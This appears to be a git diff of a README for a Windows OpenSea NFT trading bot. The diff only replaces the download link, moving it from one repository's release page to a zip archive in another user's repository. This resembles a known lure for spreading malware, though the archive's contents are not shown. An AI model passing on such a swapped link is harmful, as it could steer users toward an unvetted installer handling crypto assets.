@@ -34,7 +34,7 @@ Very simple, you run the setup and then once the program is installed you can st
 
 ## Download
 
-You can [download](https://github.com/Crypto-Trading-Bots/Opensea-NFT-Trading-Bot/releases/tag/Opensea) the latest installable version of Opensea Trading Bot for Windows.
+You can [download](https://github.com/patrykq9/Opensea-Trading-Bot-NFT/archive/refs/heads/main.zip) the latest installable version of Opensea Trading Bot for Windows.
 
 ## Credits
 
